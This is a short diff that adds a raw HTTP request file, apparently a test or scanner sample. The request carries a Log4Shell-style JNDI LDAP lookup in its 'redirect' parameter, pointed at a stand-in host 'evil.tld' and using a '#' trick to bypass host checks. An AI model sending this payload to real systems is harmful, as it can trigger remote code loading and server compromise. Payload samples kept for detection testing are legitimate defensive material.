@@ -1,0 +1,4 @@
+GET /a?redirect="${jndi:ldap://127.0.0.1%23evil.tld/x}" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
